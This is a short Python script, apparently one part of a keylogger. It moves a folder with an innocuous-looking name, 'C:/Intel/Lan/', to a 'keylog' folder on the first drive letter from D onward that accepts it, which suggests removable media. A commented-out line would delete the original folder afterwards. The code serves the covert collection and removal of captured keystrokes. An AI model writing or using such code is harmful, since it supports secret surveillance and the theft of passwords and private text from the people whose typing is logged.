import shutil

save_path = 'C:/Intel/Lan/'
home_path = ':/keylog/'

for i in range(23):   
    try:
        shutil.move(save_path, chr(i + 68) + home_path)
        break
    except:
        continue

#shutil.rmtree(save_path)